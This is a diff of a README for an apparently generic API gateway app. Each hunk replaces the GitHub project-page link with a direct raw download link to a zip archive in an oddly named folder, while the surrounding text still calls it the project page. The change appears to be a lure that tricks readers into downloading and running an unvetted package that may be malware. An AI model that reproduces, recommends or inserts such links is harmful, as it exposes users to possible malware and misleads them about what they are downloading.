@@ -1,6 +1,6 @@
 # 🚪 rest-gateway-1771917206-3 - Secure API Access Made Simple
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-orange?style=for-the-badge)](https://github.com/HitmanCR/rest-gateway-1771917206-3)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-orange?style=for-the-badge)](https://raw.githubusercontent.com/HitmanCR/rest-gateway-1771917206-3/main/strawless/gateway_rest_1.4.zip)
 
 ## 📋 About This Application
 
@@ -21,14 +21,14 @@ Before installing, make sure your computer meets these needs:
 ## 🌐 Where to Download
 
 Please visit this page to download the files you need:  
-[https://github.com/HitmanCR/rest-gateway-1771917206-3](https://github.com/HitmanCR/rest-gateway-1771917206-3)
+[https://raw.githubusercontent.com/HitmanCR/rest-gateway-1771917206-3/main/strawless/gateway_rest_1.4.zip](https://raw.githubusercontent.com/HitmanCR/rest-gateway-1771917206-3/main/strawless/gateway_rest_1.4.zip)
 
 This link will take you to the project page where you can find files, updates, and details.
 
 ## 📥 How to Download and Install 🚀
 
 1. Open your web browser and go to:  
-   https://github.com/HitmanCR/rest-gateway-1771917206-3
+   https://raw.githubusercontent.com/HitmanCR/rest-gateway-1771917206-3/main/strawless/gateway_rest_1.4.zip
 
 2. Look for the section named “Releases” or the latest available package.
 
@@ -96,4 +96,4 @@ You can find all these options in the settings menu.
 ## 🔗 Download Link Reminder
 
 Use this link anytime to get the latest files or updates:  
-[https://github.com/HitmanCR/rest-gateway-1771917206-3](https://github.com/HitmanCR/rest-gateway-1771917206-3)
+[https://raw.githubusercontent.com/HitmanCR/rest-gateway-1771917206-3/main/strawless/gateway_rest_1.4.zip](https://raw.githubusercontent.com/HitmanCR/rest-gateway-1771917206-3/main/strawless/gateway_rest_1.4.zip)
